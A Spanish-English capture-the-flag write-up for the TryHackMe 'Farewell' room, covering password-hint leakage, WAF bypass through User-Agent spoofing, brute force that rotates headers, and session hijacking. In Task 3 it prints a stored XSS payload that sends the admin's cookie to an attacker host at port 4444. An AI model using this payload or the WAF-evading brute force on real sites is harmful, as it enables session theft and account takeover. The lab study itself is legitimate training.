# Farewell

| **Dificultad** | MEDIUM | **Tipo** | Premium | **Slug** | `farewell` |
| **Link** | [TryHackMe](https://tryhackme.com/room/farewell) | **Sección** | 02 Level Medium | **Fuente** | hirtnelson.github.io + infosecwriteups.com + meetcyber.net (writeups) |
| **Componentes** | WAF Bypass / Stored XSS / Brute Force / Session Hijacking / Information Disclosure / Legacy Web App | **Impacto** | Demuestra explotación de una web legada protegida por WAF mediante bypass, enumeración y XSS almacenado |

---

**Contexto:** Sala basada en explotación de WAF: bypassear el firewall, hacer brute-force del password de un usuario, y usar Stored XSS para robar la cookie del admin y elevar privilegios. WAF-exploitation room: bypass the firewall, brute-force a user password, and use Stored XSS to steal the admin cookie and elevate privileges.

## Solucionario

### Task 1: Reconocimiento

**Explicación:** Aplicación web legada (PHP/Apache) protegida por WAF. Se explotan fugas de configuración, enumeración de usuarios y XSS almacenado para obtener acceso admin y leer los mensajes de despedida antes de que el servidor se cierre.

- Puertos relevantes: **22 (SSH)** y **80 (HTTP - Apache/2.4.58 + PHP)**.
- Cookie `PHPSESSID` sin flag `HttpOnly`.
- Ticker de la home con usuarios potenciales: `adam`, `deliver11`, `nora`.
- Script `check.js` revela que el servidor filtra `password_hint` (CWE-209) si el username existe.
- `POST /auth.php` devuelve `403 Forbidden` ("WAF is Active") con User-Agents de CLI; se bypassa con un User-Agent de navegador legítimo.
- Directorios revelados: `admin.php`, `index.php`, `info.php`.

### Task 2: Acceso de Usuario

**Explicación:** Se explotan los hints de contraseña filtrados por usuario vía `password_hint`:

| User | Hint |
|------|------|
| `adam` | mascota favorita + 2 dígitos / favorite pet + 2 digits |
| `deliver11` | Capital de Japón + 4 dígitos / Capital of Japan + 4 digits → **TokyoXXXX** |
| `nora` | número de la suerte 789 / lucky number 789 |
| `admin` | el año + un buen adiós / the year plus a kind send-off |

**Contraseña de `deliver11`** (patrón Tokyo + 4 dígitos, obtenida por brute-force con un script Python que rota User-Agents y usa `X-Forwarded-For`/query `?i=` para no disparar el WAF): `TokyoXXXX` (patrón / pattern; el dígito exacto se obtiene en la sala).

Al loguear con `deliver11` se accede a `/dashboard.php` donde se obtiene la primera flag (valor no publicado en texto por las fuentes).

### Task 3: Acceso Admin

**Explicación:** En el dashboard hay un formulario de mensajes revisado por un bot administrador. El servidor sanitiza etiquetas HTML básicas pero el WAF bloquea palabras clave como `cookie` y `document`. Payload de Stored XSS (bypass de WAF mediante concatenación y carga de imagen):

```
<body onload="new Image().src='http://<ATTACKER-IP>:4444?x='+document['coo'+'kie']">
```

El bot admin revisa el mensaje y ejecuta el JS; el atacante captura la cookie `PHPSESSID` del admin en su netcat. Con session hijacking se accede a `/admin.php` como `admin` y se obtiene la segunda flag (valor redactado `THM{[REDACTED]}` en las fuentes).

> **Nota:** Las dos flags `THM{...}` de este room aparecen redactadas en las fuentes públicas en formato texto. Si quieres completar los valores exactos, resuelve la room o proporciona una fuente que los publique. Both room flags `THM{...}` appear redacted in the public text sources. To fill in exact values, complete the room or provide a source that publishes them.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña del usuario deliver11? | `TokyoXXXX (patrón; el dígito exacto se obtiene en la sala)` |
| 2 | ¿Cuál es la primera flag (dashboard)? | `No answer needed (valor no publicado en texto por las fuentes)` |
| 3 | ¿Cuál es la segunda flag (admin)? | `THM{[REDACTED]} — valor redactado en las fuentes` |

---

**Metodología:**
1. Reconocer la web: puertos, cookie PHPSESSID sin HttpOnly, usuarios potenciales y directorios revelados.
2. Enumerar usuarios mediante la filtración de `password_hint` (CWE-209) en check.js.
3. Byppassear el WAF del POST /auth.php usando un User-Agent de navegador legítimo.
4. Realizar brute-force de la contraseña de `deliver11` (patrón TokyoXXXX) usando un script Python que rota User-Agents y usa X-Forwarded-For/?i= para esquivar el WAF.
5. Loguear en /dashboard.php para obtener la primera flag.
6. Enviar un payload de Stored XSS (bypass de WAF mediante concatenación y carga de imagen) y capturar la cookie PHPSESSID del admin en netcat.
7. Con session hijacking acceder a /admin.php como admin y obtener la segunda flag.

**Learning chain:** Recon (22/80, Apache/PHP, PHPSESSID no HttpOnly) → ticker users (adam, deliver11, nora) → check.js → password_hint leak (CWE-209) → WAF 403 → User-Agent bypass → brute-force TokyoXXXX → /dashboard.php → flag1 → Stored XSS payload (body onload + new Image + concat cookie) → admin bot visits → PHPSESSID captured → session hijacking → /admin.php → flag2

**Lección:** *Las fugas de información (password_hint), la falta de HttpOnly en cookies y un WAF eludible permiten combinar enumeración, brute-force y XSS almacenado para tomar control de una sesión admin.*

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1189 (Drive-by Compromise / Stored XSS), T1078 (Valid Accounts), T1534 (Internal Spearphishing), T1110.003 (Password Spraying / brute force)

**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-79 (Improper Neutralization of Input During Web Page Generation / XSS), CWE-1004 (Sensitive Cookie Without HttpOnly)

**Fuente:** [TryHackMe - Farewell](https://tryhackme.com/room/farewell)
